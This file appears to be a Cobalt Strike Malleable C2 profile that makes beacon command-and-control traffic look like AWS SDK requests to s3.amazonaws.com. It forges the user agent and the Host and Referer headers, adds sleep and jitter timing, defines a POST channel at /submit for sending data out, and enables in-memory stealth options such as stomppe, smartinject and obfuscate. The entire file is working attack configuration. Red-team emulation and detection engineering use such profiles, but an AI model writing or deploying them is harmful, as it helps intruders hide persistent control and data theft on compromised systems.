set useragent "aws-sdk-java/1.11.563 Linux/4.14 Java_HotSpot(TM)_64-Bit_Server_VM/25.251-b08 java/1.8.0_251";
set sleeptime 180000;
set jitter 15;

set metadata {
    netbios;
    base64;
}

http-get {
  set uri "/bucket/data/paj718bu";

  client {
    header "Host" "s3.amazonaws.com";
    header "Accept" "*/*";
    header "Referer" "https://s3.amazonaws.com/";
    metadata {
      base64;
    }
  }

  server {
    header "Content-Type" "application/octet-stream";
    output "base64";
  }
}

http-post {
  set uri "/submit";

  client {
    id {
      base64;
    }

    output {
      base64;
    }
  }

  server {
    header "Content-Type" "application/json";
    output "base64";
  }
}

stage {
    set stomppe "true";
    set smartinject "true";
    set userwx "false";
    set compile_time "4";
    set obfuscate "true";
}
